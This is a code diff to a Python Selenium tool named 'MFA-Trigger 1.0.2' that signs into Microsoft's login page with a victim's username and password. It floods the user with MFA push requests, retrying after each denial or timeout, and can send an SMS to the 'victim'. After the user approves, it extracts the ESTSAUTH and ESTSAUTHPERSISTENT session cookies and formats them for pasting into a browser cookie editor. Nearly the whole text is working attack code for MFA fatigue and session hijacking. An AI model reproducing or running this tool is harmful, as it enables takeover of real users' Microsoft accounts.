@@ -17,22 +17,23 @@ from collections import OrderedDict
 parser = argparse.ArgumentParser()
 parser.add_argument('-u', '--username', type=str, help='Specify username to trigger mfa', required=True)
 parser.add_argument('-p', '--password', type=str, help='Specify password for the user', required=True)
-parser.add_argument('-a', '--allcookies', type=bool, help='Return all cookies. By default only ESTSAUTHPERSISTENT is returnes', required=False)
 parser.add_argument('-r', '--retry', type=bool, help='Retries 2 times if user did not respond or denied.', required=False)
 parser.add_argument('-rc', '--retrycount', type=int, help='Set retry count. Default = 2', required=False)
 parser.add_argument('-pn', '--phonenumber', type=str, help='Phone number for sending sms in case of number matching', required=False)
 parser.add_argument('-s', '--sendsms', type=bool, help='Sending sms to victim.', required=False)
+parser.add_argument('-v', '--verbose', type=bool, help='Verbose', required=False)
+
 
 
 args = parser.parse_args()
 
 username = args.username
 password = args.password
-allcookiesbool = args.allcookies
 retrybool = args.retry
 retrycount = args.retrycount
 phonenumber = args.phonenumber
 sendsms = args.sendsms
+verbose = args.verbose
 
 # if phonenumber != None:
 #     parse_phonenumber = phonenumbers.parse(phonenumber)
@@ -40,12 +41,17 @@ sendsms = args.sendsms
 #         exit_program()
 
 cookiesuccess = False
+waitedtoolong = False
+waitedtoolong = False
+if retrycount == None:
+    retrycount = 2
+retrycounter = 1
 
 # Browser settings
 options = webdriver.ChromeOptions()
 options.add_argument('--ignore-ssl-errors=yes')
 options.add_argument('--ignore-certificate-errors')
-options.add_argument("-incognito")
+# options.add_argument("-incognito")
 #options.add_argument('--proxy-server=172.17.0.1:8080')
 driver = webdriver.Remote(command_executor='http://localhost:4444/wd/hub',options=options)
 
@@ -66,10 +72,12 @@ def print_banner():
     banner.append("██║╚██╔╝██║██╔══╝  ██╔══██║╚════╝██║   ██╔══██╗██║██║   ██║██║   ██║██╔══╝  ██╔══██╗")
     banner.append("██║ ╚═╝ ██║██║     ██║  ██║      ██║   ██║  ██║██║╚██████╔╝╚██████╔╝███████╗██║  ██║")
     banner.append("╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝")
-    
+    banner.append("MFA-Trigger 1.0.2")
+    banner.append("Coded by Frank Wiersma")
     print("\n")
     for i in banner:
         print(i)
+    print("\n")
 
 def exit_program():
     # if driver != None:
@@ -103,6 +111,8 @@ def startup():
 # Verifies correctness of username. Continues to submitting password if valid username was entered.
 def verify_username():
     sleep(0.5)
+    if verbose == True:
+        print("%s[Trying to login user:] %s%s" % (text_colors.green, username, text_colors.reset))
     js_get_element = "return document.getElementById('usernameError');"
     javascript_element = driver.execute_script(js_get_element)
     if javascript_element != None:
@@ -117,6 +127,8 @@ def verify_username():
 #Submit password
 def submit_password():
     sleep(0.5)
+    if verbose == True:
+        print("%s[Validating password] %s" % (text_colors.green, text_colors.reset))
     driver.find_element(By.ID, "i0118").click()
     driver.find_element(By.ID, "i0118").send_keys(password)
     driver.find_element(By.ID, "i0118").send_keys(Keys.ENTER)
@@ -180,6 +192,7 @@ def wait_for_user_mfa_approval():
             print("Waiting for user")
         elif "Stay signed in" in src:
             dump_cookies()
+            driver.find_element(By.ID, "idSIButton9").send_keys(Keys.ENTER)
             break
         
         # Check if pending MFA enrollment        
@@ -201,7 +214,9 @@ def wait_for_user_mfa_approval():
             javascript_element_content = driver.execute_script(js_get_content)
             if str(javascript_element_content) == "Request denied":
                 print("%s[User denied MFA request] %s%s" % (text_colors.red, username, text_colors.reset))  
-                retry_mfa_trigger(retrybool, retrycount, cookiesuccess)
+                userdenied = True
+                waitedtoolong = False
+                retry_mfa_trigger(retrybool, retrycount, cookiesuccess, userdenied, waitedtoolong, retrycounter)
                 break
         
         # Check if request is timed-out
@@ -212,9 +227,9 @@ def wait_for_user_mfa_approval():
             javascript_element_content = driver.execute_script(js_get_content)
             if "hear from you" in str(javascript_element_content):
                 print("%s[User waited too long.] %s%s" % (text_colors.red, username, text_colors.reset))
-                global waitedtoolong
                 waitedtoolong = True
-                retry_mfa_trigger(retrybool, retrycount, cookiesuccess) 
+                userdenied = False
+                retry_mfa_trigger(retrybool, retrycount, cookiesuccess, userdenied, waitedtoolong, retrycounter) 
                 break
             else:
                 print("Error here")
@@ -222,23 +237,23 @@ def wait_for_user_mfa_approval():
         else:
             continue
 
-def retry_mfa_trigger(retrybool, retrycount, cookiesuccess, waitedtoolong):
+def retry_mfa_trigger(retrybool, retrycount, cookiesuccess, userdenied, waitedtoolong, retrycounter):    
+    print("Retrycounter = " + str(retrycounter))
     if retrybool == True and cookiesuccess == False:
-        if retrycount == None:
-            retrycount = 2
-        for i in range(1, retrycount+1):
+        for i in range(retrycounter, retrycount+1):
             if cookiesuccess == True:
                 exit_program()
             else: 
-                print("%s[Retrying MFA request.] %s Retry: %s %s" % (text_colors.red, username, i, text_colors.reset))        
+                print("%s[Retrying MFA request.] %s Retry: %s %s" % (text_colors.red, username, retrycounter, text_colors.reset))        
                 if waitedtoolong == True:
                     driver.find_element(By.ID, "idA_SAASTO_Resend").click()
-                else: 
+                elif userdenied == True:
                     driver.find_element(By.ID, "idA_SAASDS_Resend").click()
-                sleep(1)
-                check_number_matching()                    
-                i+=1
-
+            retrycounter+=1
+            print("Incremented retrycount = " + str(retrycounter))
+            sleep(1)
+            check_number_matching()
+            return retrycounter
 
 def dump_cookies():
     print("Seems like we have the cookies!")
@@ -246,20 +261,15 @@ def dump_cookies():
     cookiename = "ESTSAUTHPERSISTENT"
     global cookiesuccess
     cookiesuccess = True
-    if allcookiesbool == True:
-        for cookie in cookies:
-            print(cookie)
-        print("\n")
-        print("Successfully captured COOKIES for " + str(username)+"!")
-        print("\n")
-        print("\n")
-        print("\n")
-        print(cookies)
-    else:
-        print("Dumping only " + str(cookiename) + " cookie. Specify '-a True' to dump all cookies.")
-        print(cookies[2])
-        print("\n")
-        print("Successfully captured COOKIES for " + str(username)+"!")
+    print("\n")
+    cookie_ESTSAUTH = '[{"domain": ".login.microsoftonline.com", "hostOnly": false, "httpOnly": true, "name": "ESTSAUTH", "path": "/", "sameSite": "no_restriction", "secure": true, "session": true, "storeId": null, "value": "'+ driver.get_cookie('ESTSAUTH')['value']+'"}]'
+    cookie_ESTSAUTHLIGHT = '[{"domain": ".login.microsoftonline.com", "hostOnly": true, "httpOnly": false, "name": "ESTSAUTHLIGHT", "path": "/", "sameSite": "no_restriction", "secure": true, "session": true, "storeId": null, "value": "'+ driver.get_cookie('ESTSAUTHLIGHT')['value']+'"}]'
+    cookie_ESTSAUTHPERSISTENT = '[{"domain": ".login.microsoftonline.com","expirationDate": '+ str(driver.get_cookie(cookiename)['expiry'])+', "hostOnly": true, "httpOnly": false, "name": "ESTSAUTHPERSISTENT", "path": "/", "sameSite": "no_restriction", "secure": true, "session": false, "storeId": null, "value": "'+ driver.get_cookie(cookiename)['value']+'"}]'
+    print("%s[Captured cookies]%s" % (text_colors.red, text_colors.reset)) 
+    print(cookie_ESTSAUTHLIGHT[:-1]+","+cookie_ESTSAUTH[1:-1]+","+cookie_ESTSAUTHPERSISTENT[1:])
+    print("\n")
+    print("Successfully captured COOKIES for " + str(username)+"!")
+    print("You can directly paste the COOKIES in the cookie-editor browser extension")
 
 print_banner()
 
